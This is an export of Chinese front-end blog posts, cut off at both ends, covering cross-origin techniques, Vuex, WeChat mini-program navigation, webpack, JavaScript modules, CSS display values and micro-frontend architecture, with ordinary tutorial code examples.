&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 七、使用 WebSocket 实现跨域WebSocket 没有跨域限制，高级 API（不兼容），想要兼容低版本浏览器，可以使用 socket.io 的库，WebSocket 与 HTTP 内部都是基于 TCP 协议，区别在于 HTTP 是单向的（单双工），WebSocket 是双向的（全双工），协议是 ws:// 和 wss:// 对应 http:// 和 https://，因为没有跨域限制，所以使用 file:// 协议也可以进行通信。 由于我们在 NodeJS 服务中使用了 WebSocket，所以需要安装对应的依赖： npm install ws –save 123456789101112131415161718192021222324252627282930313233343536373839&lt;!-- 文件：index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 创建 webSocket let socket = new WebSocket('ws://localhost:3000'); // 连接上触发 socket.onopen = function () { socket.send('I love you'); } // 收到消息触发 socket.onmessage = function (e) { // 打印收到的数据 console.log(e.data); // I love you, too } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;const express = require(&quot;express&quot;);let app = express();// 引入 webSocketconst WebSocket = require(&quot;ws&quot;);// 创建连接，端口号与前端相对应let wss = new WebSocket.Server({ port: 3000 });// 监听连接wss.on(&quot;connection&quot;, function(ws) { // 监听消息 ws.on(&quot;message&quot;, function(data) { // 打印消息 console.log(data); // I love you // 发送消息 ws.send(&quot;I love you, too&quot;); });}); 八、使用 nginx 实现跨域nginx 本身就是一个服务器，因此我们需要去 nginx 官网下载服务环境 http://nginx.org/en/download....。 下载后解压到一个文件夹中双击 nginx.exe 启动（此时可以通过 http://localhost 访问 nginx 服务）在目录新建 json 文件夹进入 json 文件夹新建 data.json 文件并写入内容回到 nginx 根目录进入 conf 文件夹使用编辑器打开 nginx.conf 进行配置data.json 文件： 123{ &quot;name&quot;: &quot;nginx&quot;} nginx.conf 文件： 123456789101112server { . . . location ~.*.json { root json; add_header &quot;Access-Control-Allow-Origin&quot; &quot;*&quot;; } . . .} 含义： ~..json：代表忽略大小写，后缀名为 json 的文件；root json：代表 json 文件夹；add_header：代表加入跨域的响应头及允许访问的域， 为允许任何访问。在 nginx 根目录启动 cmd 命令行（windows 系统必须使用 cmd 命令行）执行下面代码重启 nginx。 nginx -s reload 不跨域访问：http://localhost/data.json 跨域访问时需要创建跨域条件代码如下： 12345// 服务器const express = require(&quot;express&quot;);let app = express();app.use(express.static(__dirname));app.listen(3000); 跨域访问：http://localhost:3000/index.html 12345678910111213141516171819202122&lt;!-- 文件：index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;nginx跨域&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; let xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost/data.json', true); xhr.onreadystatechange = function () { if(xhr.readyState === 4) { if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) { console.log(xhr.response); } } } xhr.send(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 九、使用 http-proxy-middleware 实现跨域NodeJS 中间件 http-proxy-middleware 实现跨域代理，原理大致与 nginx 相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置 cookieDomainRewrite 参数修改响应头中 cookie 中的域名，实现当前域的 cookie 写入，方便接口登录认证。 1、非 vue 框架的跨域（2 次跨域） 123456789101112131415161718&lt;!-- 文件：index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;proxy 跨域&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; var xhr = new XMLHttpRequest(); // 前端开关：浏览器是否读写 cookie xhr.withCredentials = true; // 访问 http-proxy-middleware 代理服务器 xhr.open('get', 'http://www.proxy1.com:3000/login?user=admin', true); xhr.send(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 中间代理服务中使用了 http-proxy-middleware 中间件，因此需要提前下载： npm install http-proxy-middleware –save-dev 12345678910111213141516171819202122232425262728293031323334// 中间代理服务器const express = require(&quot;express&quot;);let proxy = require(&quot;http-proxy-middleware&quot;);let app = express();app.use( &quot;/&quot;, proxy({ // 代理跨域目标接口 target: &quot;http://www.proxy2.com:8080&quot;, changeOrigin: true, // 修改响应头信息，实现跨域并允许带 cookie onProxyRes: function(proxyRes, req, res) { res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;http://www.proxy1.com&quot;); res.header(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); }, // 修改响应信息中的 cookie 域名 cookieDomainRewrite: &quot;www.proxy1.com&quot; // 可以为 false，表示不修改 }));app.listen(3000);// 服务器const http = require(&quot;http&quot;);const qs = require(&quot;querystring&quot;);const server = http.createServer();server.on(&quot;request&quot;, function(req, res) { let params = qs.parse(req.url.substring(2)); // 向前台写 cookie res.writeHead(200, { &quot;Set-Cookie&quot;: &quot;l=a123456;Path=/;Domain=www.proxy2.com;HttpOnly&quot; // HttpOnly：脚本无法读取 }); res.write(JSON.stringify(params)); res.end();});server.listen(&quot;8080&quot;); vue 框架的跨域（1 次跨域） 利用 node + webpack + webpack-dev-server 代理接口跨域。在开发环境下，由于 Vue 渲染服务和接口代理服务都是 webpack-dev-server，所以页面与代理接口之间不再跨域，无须设置 Headers 跨域信息了。 1234567891011121314151617// 导出服务器配置module.exports = { entry: {}, module: {}, ... devServer: { historyApiFallback: true, proxy: [{ context: '/login', target: 'http://www.proxy2.com:8080', // 代理跨域目标接口 changeOrigin: true, secure: false, // 当代理某些 https 服务报错时用 cookieDomainRewrite: 'www.leheavengame.com' // 可以为 false，表示不修改 }], noInfo: true }}","link":"/2018/11/19/%E5%AE%9E%E7%94%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%B3%95/"},{"title":"对于vuex的使用","text":"vuex是什么？官网的解释Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 devtools，extension，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。 vuex 在项目中的使用【通过vue-cli 脚手架搭建的项目中】安装1npm install vuex --save 在main.js中 引入1234567891011121314151617181920212223242526//main.jsimport Vuex from 'vuex';Vue.use(Vuex);//创建一个store以便于在所有组件都能查询到vuex的数据const store = new Vuex.Store({ state: { count: 0 }, mutations: { increment (state) { state.count++ } }});//简单测试//store.commit('increment')//console.log(store.state.count);//在vue实例中引用export default new Vue({ el: '#app', store, components: { App }, template: '&lt;App/&gt;'}); vuex核心概念的使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//main.jsconst store = new Vuex.Store({ //数据存储的字段 state: { count: 0 }, //更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。 mutations: { increment (state,value) { state.count+=value } }, //可以理解为一个动作，它提交的是 mutation，而不是直接变更状态。 actions: { increment (context,value) { context.commit('increment',value) } }, //将数据返回出去，以便于组件中拿到count值 getters:{ getCounts:state =&gt;state.count }});//新建一个组件，假设命名为demo.vue&lt;template&gt; &lt;div&gt; {{counts}} &lt;/div&gt;&lt;/template&gt; &lt;script&gt; export default { name: 'demo', data () { return { } }, computed:{ //通过计算属性监听vuex里面 count的值 counts(){ return this.$store.getters.getCounts; } }, created(){ setTimeout(()=&gt;{ //action 方法提交 this.$store.dispatch('increment',10) },2000) } } &lt;/script&gt; 随后，可以将store在main.js中处理出来，src目录下新建一个文件夹命名为store,新建index.js,actions.js,getters.js,mutation-types.js,mutations.js\\ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//index.jsimport Vue from 'vue';import Vuex from 'vuex';import mutations from './mutations';import actions from './actions';import getters from './getters';Vue.use(Vuex);export const store = new Vuex.Store({ state: { count: 1, }, mutations, actions, getters});// mutation-types.jsexport const INCREMENT=&quot;INCREMENT&quot;;// action.jsimport { INCREMENT} from './mutation-types';export default { [INCREMENT]({ commit, state },value) { commit(INCREMENT,value); },};// mutations.jsimport { INCREMENT} from './mutation-types';export default { [INCREMENT](state, value) { state.count += value; }};// getters.jsimport { INCREMENT} from './mutation-types';const getters = { [INCREMENT]: state =&gt; state.count,};export default getters;&lt;/pre&gt;&lt;p&gt;main.js&lt;/p&gt;&lt;pre&gt;//main.js// The Vue build version to load with the `import` command// (runtime-only or standalone) has been set in webpack.base.conf with an alias.import Vue from 'vue'import App from './App'import router from './router'import { store } from './store';Vue.config.productionTip = falsenew Vue({ el: '#app', router, store, components: { App }, template: '&lt;App/&gt;'}) demo.vue123456789101112131415161718192021222324252627&lt;template&gt; &lt;div&gt; {{counts}} &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'demo', data () { return { } }, computed:{ //通过计算属性监听vuex里面 count的值 counts(){ return this.$store.getters['INCREMENT']; } }, created(){ setTimeout(()=&gt;{ //action 方法提交 this.$store.dispatch('INCREMENT',10) },2000) } } &lt;/script&gt;","link":"/2018/04/15/%E5%AF%B9%E4%BA%8Evuex%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"微信小程序 navigator跳转url参数传递","text":"使用方法说明传值:在navigator的属性url后拼接?id(参数名字)=要传递的值 (如果多个参数用&amp;分开 &amp;name=value&amp;…….)1234567891011121314151617181920&lt;view class=&quot;good-nav&quot;&gt; &lt;navigator class=&quot;good-nav-item&quot; url=&quot;/pages/index/good/good?type=1&quot;&gt; &lt;image src=&quot;http://www.leheavengame.com/wxImages/good-nav01.png&quot;&gt;&lt;/image&gt; 护肤系列 &lt;/navigator&gt; &lt;navigator class=&quot;good-nav-item&quot; url=&quot;/pages/index/good/good?type=2&quot;&gt; &lt;image src=&quot;http://www.leheavengame.com/wxImages/good-nav02.png&quot;&gt;&lt;/image&gt; 面膜系列 &lt;/navigator&gt; &lt;navigator class=&quot;good-nav-item&quot; url=&quot;/pages/index/good/good?type=3&quot;&gt; &lt;image src=&quot;http://www.leheavengame.com/wxImages/good-nav03.png&quot;&gt;&lt;/image&gt; 彩妆系列 &lt;/navigator&gt; &lt;navigator class=&quot;good-nav-item&quot; url=&quot;/pages/index/good/good?type=4&quot;&gt; &lt;image src=&quot;http://www.leheavengame.com/wxImages/good-nav04.png&quot;&gt;&lt;/image&gt; 小样旅行装&lt;/navigator&gt; &lt;navigator class=&quot;good-nav-item&quot; url=&quot;/pages/index/good/good?type=5&quot;&gt; &lt;image src=&quot;http://www.leheavengame.com/wxImages/good-nav05.png&quot;&gt;&lt;/image&gt; 赠品专区&lt;/navigator&gt;&lt;/view&gt; 取值：options 是包含url地址中参数的对象，可以直接 点+参数名(.+name) 获取。123456789101112131415161718192021onLoad: function (options) { var that=this; wx.showLoading({ title: '加载中', }) let goodType=options.type //url地址中type的值 wx.request({ url: 'https://www.leheavengame.com/ywhx/play', method: 'POST', data: { type: goodType }, header: { //向api 推送选择的格式 'content-type': ' application/x-www-form-urlencoded' }, success: function (res) { console.log(res) wx.hideLoading() })}","link":"/2017/10/15/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-navigator%E8%B7%B3%E8%BD%ACurl%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/"},{"title":"对于Webpack的简单理解","text":"关于webpack:webpack大而全，和静态资源相关的所有它都能干涉，当然，还能启动server；webpack主要以loaders和plugins处理各种静态资源； loaders：在React里会用到JSX、ES6、js，我统一将文件后缀使用.js，便于babel的配置： npm install –save babel-loader 12345678{ test: /\\.js?$/, exclude: /node_modules/, loader: 'babel', query: { presets: ['es2015', 'react'] }} CSS、scss、iconfront字体文件：npm install –save style-loader css-loader sass-loader url-loader file-loader 12345678910111213141516{ test:/\\.css$/, loader: ExtractTextPlugin.extract(&quot;style-loader&quot;, &quot;css-loader&quot;)},{ test: /\\.scss$/, loader: ExtractTextPlugin.extract(&quot;style-loader&quot;, &quot;css!sass&quot;)},{ test: /\\.(woff|woff2)/, loader: &quot;url?limit=10000&amp;minetype=application/font-woff&amp;name=./[name].[ext]&quot; },{ test: /\\.(ttf|eot|svg)/, loader: &quot;file?name=./[name].[ext]&quot;},{ test: /\\.otf/, loader: &quot;file?name=./[name].[ext]&amp;minetype=application/font-otf&quot;} 想将css独立出来的话：npm install –save extract-text-webpack-plugin 123var plugins=[];var ExtractTextPlugin = require('extract-text-webpack-plugin');plugins.push(new ExtractTextPlugin('./app-[hash].css?[hash]')); 处理图片：npm install –save url-loader 1234{ test:/\\.(png|jpg|gif)$/, loader:'url-loader?limit=10&amp;name=[name].[ext]'} 多个loader通过！区分，同时接受查询参数以？连接，类似于用！区分多个url，比如：loader1?name=[name]-[hash].[ext]&amp;limit=10000!loader2?xxx=xx；可以使用require语句加载loader，也可以通过配置中的正则表达式来绑定loader； plugins：html-webpack-plugin会由entry的配置将入口文件所属的html文件作为模板，重新生成一个html文件，其中的静态资源都已根据配置打包好，貌似很不错哦！不过有两个问题，还没解决：（1）、如果静态资源和主站是各自独立的站点，而将html作为静态资源对待的话，主站有路由相关配置的话，好像有点扯不开了；要是只在本地开发这样配置，各自独立上线的话，跨域时本地不便于测试；（2）、页面上的图片路径没做处理，可能要求有点多了。。。（3）、将html作为模板对待了，那么如何include其他模板；由于这三个原因，暂时不敢说html-webpack-plugin很适用，特别是第一点；继续探索中。 123456789var plugins=[];var HtmlWebpackPlugin = require('html-webpack-plugin');plugins.push(new HtmlWebpackPlugin({ template: './files/es6.html', filename: 'es6.html', title:'hhhhhh', inject: true, chunks:['entry1']//可以new多个html由entry区分})); 使用webpack后，对文件的版本hash将变得非常简单：出口文件的name加上[hash]即可；可能现在来说，清除静态资源缓存最好的做法就是文件名hash了，注意不是加个后缀可以的；对于流量非常高的站点，即使等到三更半夜上线，如果仅仅加个后缀清缓存的话，也难免会出事，因为页面和静态资源同步时会有时间差，而在这个间隙有用户访问的话，页面出错的可能性就很大了；而文件名hash的方式就能很好的避免这个问题，由于每次改动后生成的文件名都不一样，上线并不是覆盖之前的版本，只是多了一个版本的文件，再上页面文件即使同步有时间差，要么访问旧版页面和旧版资源，要么访问新版页面新版资源，就不存在冲突了，这样服务器可以大胆的对静态资源开启永久强缓存，并且有利于回滚；至于静态资源由此产生的积压，交给运维处理吧！ 使用html-webpack-plugin能很好的配合文件名hash，基于上面的小问题。。。 现在生成文件名hash很简单了，怎么对应页面一起改呢？ 自己动手慢慢改去吧 页面由前端输出：生成map.json，根据这个配置读文件对应改资源引用的路径 页面由后端输出：生成map.json，后端读这个配置动态加载页面引用的资源路径 总之，就是要生成map.json，这里就简化了很多，因为不用管文件依赖了，webpack已将依赖文件打包到主文件里了；接下来就是读这个配置文件了，我也不知道，再探！。。。 由assets-webpack-plugin生成map.json： 1234567var AssetsPlugin = require('assets-webpack-plugin');plugins.push(new AssetsPlugin({ filename: 'map.json', processOutput: function (assets) { return JSON.stringify(assets); }})); map.json大概这样： 123456{&quot;entry1&quot;: { &quot;js&quot;:&quot;app-ed03f4fe.js&quot;, &quot;css&quot;:&quot;app-6f7f3cda3d230d8fa897.css&quot; }}","link":"/2017/05/10/%E5%AF%B9%E4%BA%8EWebpack%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/"},{"title":"模块化简析","text":"关于模块化，最直接的表现就是我们写的 require 和 import 关键字，如果查阅相关资料，就一定会遇到 CommonJS 、CMD AMD 这些名词，以及 RequireJS、SeaJS 等陌生框架。比如 SeaJS 的官网 这样描述自己: “简单友好的模块定义规范，Sea.js 遵循 CMD 规范。自然直观的代码组织方式，依赖的自动加载……” JavaScript 基础 做客户端的同学对 OC 的 #import “classname”、Swift 的 Module 以及文件修饰符 和 Java 的 import package+class 模式应该都不陌生。我们习惯了引用一个文件就是引用一个类的模式。然而在 JavaScript 这种动态语言中，事情又有一些变化，举个例子说明: 123456789101112131415161718192021&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;hello&quot;&gt; Hello Wrold &lt;/p&gt;&lt;input type=&quot;button&quot; onclick=&quot;onPress()&quot; value=&quot;Click me&quot; /&gt;&lt;/body&gt;&lt;/html&gt;// index.jsfunction onPress() {var p = document.getElementById('hello');p.innerHTML = 'Hello bestswifter';} HTML 中的 &lt;/head&gt; &lt;body&gt; &lt;p id=&quot;hello&quot;&gt; Hello Wrold &lt;/p&gt; &lt;input type=&quot;button&quot; onclick=&quot;onPress()&quot; value=&quot;Click me&quot; /&gt; &lt;/body&gt; &lt;/html&gt;// index.jsfunction onPress() {var p = document.getElementById('hello');p.innerHTML = add(1, 2);} 可以看到这种写法并不优雅， index.js 对别的 JS 文件中的内容并没有控制权，能否调用到 add 方法完全取决于使用自己的 HTML 文件有没有正确引用别的 JS 文件。 初步模块化 刚刚所说的痛点其实可以分为两种:（1） index.js 无法 import，依赖于 HTML 的引用;（2）index.js 中无法对 add 方法的来源做区分，缺少命名空间的概念。 第一个问题留在后面解答，我们先着手解决第二个问题，比如先把函数放到一个对象中，这样我们可以暴露一个对象，让使用者调用这个对象的多个方法: 123456789101112//index.jsfunction onPress() {var p = document.getElementById('hello');p.innerHTML = math.add(1, 2);}//math.jsvar math = {base: 0,add: function(a, b) {return a + b + base;},}; 可以看到在 index.js 中已经可以指定一个简易版的命名空间了(也就是 math)。但目前还有一个小问题，比如 base 这个属性会被暴露给外界，也可以被修改。所以更好的方式是将 math 定义在一个闭包里，从而隐藏内部属性: 123456789// math.jsvar math = (function() {var base = 0;return {add: function(a, b) {return a + b + base;},};})(); 到目前为止，我们实现了模块的定义和使用。不过模块化的一大精髓在于命名空间，也就是说我们希望自己的 math 模块不是全局的，而是按需导入，这样一来，即使多个文件暴露同名对象也不会出问题。就像 node.js 中那样，需要暴露的模块定义自己的 export 内容，然后调用方使用 require 方法。 其实可以简单模拟一下 node.js 的工作方式，通过增加一个中间层来解决: 首先定义一个全局变量: 123456789101112131415161718192021// global.jsvar module = {exports: {}, // 用来存储所有暴露的内容}; //然后在 math.js 中暴露对象:var math = (function() {var base = 0;return {add: function(a, b) {return a + b + base;},};})();module.exports.math = math; //使用者 index.js 现在应该是:var math = module.exports.math;function onPress() {var p = document.getElementById('hello');// mathp.innerHTML = math.add(1, 2);} 现有模块化方案 上述简单的模块化方式有一些小问题。首先，index.js 必须严格依赖于 math.js 执行，因为只有 math.js 执行完才会向全局的 module.export 中注册自己。这就要求开发者必须手动管理 js 文件的加载顺序。随着项目越来越大，依赖的维护会变得越来越复杂。 其次，由于加载 JS 文件时，浏览器会停止渲染网页，因此我们还需要 JS 文件的异步按需加载。 最后一个问题是，之前给出的简化版模块化方案并没有解决模块的命名空间，相同的导出依旧会替换掉之前的内容，而解决方案则是维护一个 “文件路径 &lt;–&gt; 导出内容” 的表，并且根据文件路径加载。 基于上述需求，市场上出现了很多套模块化方案。为啥会有多套标准呢，实际上还是由前端的特性导致的。由于缺乏一个统一的标准，所以很多情况下大家做事的时候都是靠约定，就比如上述的 export 和 require。如果代码的提供者把导出内容存储在 module.exports 里，而使用者读取的是 module.export，那自然是徒劳的。不仅如此，各个规范的实现方式、使用场景也不尽相同。 CommonJS 比较知名的规范有 CommonJS、AMD 和 CMD。而知名框架 Node.js、RequireJS 和 Seajs 分别实现了上述规范。 最早的规范是 CommonJS，Node.js 使用了这一规范。这一规范和我们之前的做法比较类似，是同步加载 JS 脚本。这么做在服务端毫无问题，因为文件都存在磁盘上，然而浏览器的特性决定了 JS 脚本需要异步加载，否则就会失去响应，因此 CommonJS 规范无法直接在浏览器中使用。 AMD 浏览器端著名的模块管理工具 Require.js 的做法是异步加载，通过 Webworker 的 importScripts(url); 函数加载 JS 脚本，然后执行当初注册的回调。Require.js 的写法是: 12345require(['myModule1', 'myModule2'], function (m1, m2){// 主回调逻辑m1.printName();m2.printName();}); 由于这两个模块是异步下载，因此哪个模块先被下载、执行并不确定，但可以肯定的是主回调一定在所有依赖都被加载完成后才执行。 Require.js 的这种写法也被称为前置加载，在写主逻辑之前必须指定所有的依赖，同时这些依赖也会立刻被异步加载。 由 Require.js 引申出来的规范被称为 AMD(Asynchronous Module Definition)。 CMD 另一种优秀的模块管理工具是 Sea.js，它的写法是: 12345678define(function(require, exports, module) {var foo = require('foo'); // 同步foo.add(1, 2);...require.async('math', function(math) { // 异步math.add(1, 2);});}); Sea.js 也被称为就近加载，从它的写法上可以很明显的看到和 Require.js 的不同。我们可以在需要用到依赖的时候才申明。 Sea.js 遇到依赖后只会去下载 JS 文件，并不会执行，而是等到所有被依赖的 JS 脚本都下载完以后，才从头开始执行主逻辑。因此被依赖模块的执行顺序和书写顺序完全一致。 由 Sea.js 引申出来的规范被称为 CMD(Common Module Definition)。 ES6 模块化 在 ES6 中，我们使用 export 关键字来导出模块，使用 import 关键字引用模块。需要说明的是，ES 6 的这套标准和目前的标准没有直接关系，目前也很少有 JS 引擎能直接支持。因此 Babel 的做法实际上是将不被支持的 import 翻译成目前已被支持的 require。 尽管目前使用 import 和 require 的区别不大(本质上是一回事)，但依然强烈推荐使用 import 关键字，因为一旦 JS 引擎能够解析 ES 6 的 import 关键字，整个实现方式就会和目前发生比较大的变化。如果目前就开始使用 import 关键字，将来代码的改动会非常小。","link":"/2017/03/22/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%AE%80%E6%9E%90/"},{"title":"梳理css中display的写法","text":"从大的分类来讲， display的写法可以分为 6个大类，再加上 1个全局类，一共是 7大类： 外部值 内部值 列表值 属性值 显示值 混合值 全局值 外部值所谓外部值，就是说这些值只会直接影响一个元素的外部表现，而不影响元素里面的儿子级孙子级元素的表现。 display: block;我们最熟悉的 缺省就是这个值，最基本的块级元素，属于 css入门初学者都知道的概念，只要是容器类型的元素基本都是这个值。 display: inline;行内元素，只要是个行内元素都是这个值。 display: run-in;这个值有点奇怪，通常没人用它，但你可以知道它。因为除了 IE和 Opera支持它以外，其他所有主流浏览器包括 Chrome, Safari, Firefox全都对它置若罔闻。这东西说白了也没什么神秘，它的意思就是说如果我们命令一个元素 run-in，中文意思就是『 闯入』！那么这个元素就直接闯入下一行。 写起来大概就是这样： 123456&lt;div class=&quot;a&quot;&gt;aaa&lt;/div&gt;&lt;div class=&quot;b&quot;&gt;bbb&lt;/div&gt;.a { font-size: 36px; display: run-in;} 内部值内部值主要是用来管束自己下属的儿子级元素的排布的，规定它们或者排成 S形，或者排成 B形这样的。 display: flow;含义不清，实验室阶段产品， Chrome不支持。如果还不够说服你暂时不要碰它的话，试着理解以下英文原文： If its outer display type is inline or run-in, and it is participating in a block or inline formatting context, then it generates an inline box. Otherwise it generates a block container box. display: flow-root;不同于刚才谈到的 flow，现在用 flow-root的渐渐多起来了，因为它可以撑起被你 float掉的块级元素的高度。 display: table;这一个属性，以及下面的另外 8个与 table相关的属性，都是用来控制如何把 div显示成 table样式的，因为我们不喜欢 这个标签嘛，所以我们想把所有的 标签都换成 标签。 display: flex;display:flex;以及与它相关联的一系列属性： flex-direction, flex-wrap, flex-flow, justify-content, align-items, align-content，并且包括所有这些属性的取值，都是你需要反复研磨的。 2009年诞生的这个属性可以说是不亚于 css界一场蒸汽机诞生一样的工业革命，它的诞生标志着马车一样的 float被彻底抛进历史的垃圾堆。 display: grid grid布局，中文翻译为 网格布局。学习 grid布局有两个重点：一个重点是 grid布局引入了一个全新的单位： fr，它是 fraction（ 分数）的缩写，所以从此以后，你的兵器库里除了 px, em, rem, 百分比这些常见兵器以及 vw, vh这些新式武器之外，又多了一样旁门暗器 fr，要想用好 grid，必须充分掌握 fr。另一个重点是 斜杠操作符，这可不是 分数哦。它表示的是 起始位置和 结束位置。比如说 3/4，这可不是 四分之三的意思，这是指一个元素从第 3行开始，到第 4行结束，但又不包括第 4行。 display: ruby;ruby这个取值对于我们亚洲人来说其实是非常有用的一个东西，但是目前除了 Firefox以外其它浏览器对它的支持都不太好。简而言之， display:ruby;的作用就是可以做出下面这样的东西： display: subgrid;subgrid总的思想是说大网格里还可以套小网格，互相不影响。 列表值display: list-item;display:list-item;和 display:table;一样。用 ul li能实现的效果，他可以用 div实现出来，就是这个作用。 属性值属性值一般是附属于主值的，比如主值里设置了 display:table;，就可以在子元素里使用 display:table-row-group;等等属性，不过并不绝对。关于它们的作用，主要参考主值就够了。 display: table-row-group;详情参考display: tabl;。 display: table-header-group;详情参考display: table。 display: table-footer-group;详情参考display: table。 display: table-row;详情参考display: table。 display: table-cell;详情参考display: table;这个属性有必要详细说说，因为它完全可以单独应用，用在高度不固定元素的垂直居中上。 display: table-column-group;详情参考display: table。 display: table-column;详情参考display: table。 display: table-caption;详情参考display: table。 display: ruby-base;详情参考display: ruby。 display: ruby-text;详情参考display: ruby。 display: ruby-base-container;详情参考display: ruby。 display: ruby-text-container;详情参考display: ruby。 显示值MDN里把它叫做《 display-box 》 values（ 盒子值），我把它叫做 显示值，主要是为了便于理解。 display: contents;display:contents的作用：它让子元素拥有和父元素一样的布局方式，仅此而已。 display: none;混合值display: inline-block;display: inline-table;display: inline-flex;全局值这些值不是 display属性的专利，几乎其它任意属性都可以用，列在这里凑个数。 display: inherit;继承父元素的 display属性。 display: initial;不管父元素怎么设定，恢复到浏览器最初始时的 display属性。 display: unset;unset混合了 inherit和 initial。如果父元素设值了，就用父元素的设定，如果父元素没设值，就用浏览器的缺省设定。","link":"/2018/03/26/%E6%A2%B3%E7%90%86css%E4%B8%ADdisplay%E7%9A%84%E5%86%99%E6%B3%95/"},{"title":"探索微前端架构：多种实现方式与实践思考","text":"在当今的前端开发领域，微前端架构正逐渐成为热门话题。它借鉴了微服务的理念，将原本庞大的单体前端应用拆解为多个小型前端应用，并能让它们协同工作，就如同一个完整的应用一样。今天，咱们就一起来深入探讨微前端架构的几种常见实现方式以及在实际应用中需要考虑的方方面面。 一、微前端架构概述微前端架构的核心思想，就是把 Web 应用从单一的单体应用转变成多个小型前端应用聚合而成的形态。这些小型前端应用具备独立运行、独立开发以及独立部署的能力，而且还能共享组件，实现并行开发。这里所说的前端应用是基于前后端分离的单应用页面，这是谈论微前端的基础前提。 二、微前端的几种实现方式（一）路由分发式微前端通过路由将不同的业务分发到不同的、独立前端应用上，这就是路由分发式微前端。实现它通常可以借助 HTTP 服务器的反向代理，或者利用应用框架自带的路由功能。目前来看，这种方式是采用最多、最容易上手的 “微前端” 方案。 但它也有个小缺点，那就是看起来更像是把多个前端应用简单拼凑在一起，每次用户从 A 应用切换到 B 应用的时候，往往需要刷新一下页面，用户体验上稍打折扣。 给大家举个实际项目里的例子吧，之前在进行遗留系统重写的项目中，我们制定了这样的迁移计划： 1.先用静态网站生成动态生成首页。 2.接着使用 React 技术栈重构详情页。 3.最后替换搜索结果页。 整个系统不是一次性迁移完成的，每完成一个步骤就得上线相应功能，这时就用到了 Nginx 来进行路由分发啦。下面就是一个基于路由分发的 Nginx 配置示例代码哦： 123456789101112131415161718http { server { listen 80; server_name www.phodal.com; location /api/ { proxy\\_pass http://http://172.31.25.15:8000/api; } location /web/admin { proxy_pass http://172.31.25.29/web/admin; } location /web/notifications { proxy_pass http://172.31.25.27/web/notifications; } location / { proxy_pass /; } }} 在这个配置里，不同页面的请求就被精准地分发到了不同的服务器上呢。 这种路由分发式微前端适用于以下几种场景： 不同技术栈之间差异比较大，难以兼容、迁移、改造的时候。 项目不想花费大量时间在系统改造上。 现有的系统在未来将会被取代。 系统功能已经很完善，基本不会有新需求。 要是想在这种情况下提升用户体验，还可以考虑结合 iframe 的方式来解决。 （二）使用 iFrame 创建容器iFrame 虽然是个很古老、看似普通的技术，但它一直都挺管用的。&lt;iframe&gt;元素可以将另一个 HTML 页面嵌入到当前页面中，相当于创建了一个全新的独立宿主环境，能让前端应用之间相互独立运行。 不过采用 iframe 也是有前提条件的，要是网站不需要 SEO 支持，并且拥有相应的应用管理机制，那它就是个不错的选择。比如说在做应用平台，需要集成第三方系统或者多个不同部门团队下的系统时，就很适用。 但使用 iframe 也不是光把它嵌入就完事，还得设计管理应用机制、应用通讯机制以及加载机制。比如说通讯机制，直接在每个应用里创建 postMessage 事件并监听不太友好，因为对应用的侵入性太强，更好的做法是通过 iframeEl.contentWindow 去获取 iFrame 元素的 Window 对象。定义一套通讯规范，如事件名采用什么格式、什么时候开始监听事件等等。 （三）自制框架兼容应用现有的前端框架不管是基于 Web Components 的 Angular，还是基于 VirtualDOM 的 React 等，都离不开基本的 HTML 元素 DOM。那就是在页面合适的地方引入或者创建 DOM，然后在用户操作时，加载对应的应用（触发应用的启动），并且能卸载应用。 在前端开发领域，DOM 操作的复杂性不容小觑。创建 DOM 或许相对易于处理，然而移除 DOM 及其相关应用的监听事件却颇具挑战性，特别是在涉及多种技术栈的情况下，往往需要精心设计一套专用逻辑。例如 Single-SPA，尽管它能够处理包括 React、Angular、Vue 等多数框架的启动与卸载流程，但就生产环境而言，其仍存在局限性。此前，在依托 Single-SPA 并针对 Vue 框架开展微前端架构应用搭建的实践进程中，历经全面综合的考量与权衡，我最终选定了一款在网上开源且名为 Mooa 的框架。借其之力，得以更精准地契合项目的特定需求，为项目的顺利推进提供了有力支撑与保障。以更好地满足项目需求。 这种方式上手难度相对高些，不过后期订制和可维护性比较方便。当然它也有风险，比如可能会遇到第三方库不兼容的问题，而且对于流量大的 toC 应用来说，首次加载时会多出大量请求。 （四）组合式集成：将应用微件化组合式集成就是通过软件工程的方式，在构建前、构建时、构建后等步骤中对应用进一步拆分，然后再重新组合。它其实满足了微前端的独立运行、独立开发、独立部署这三个要素，再配合前端框架的组件 Lazyload 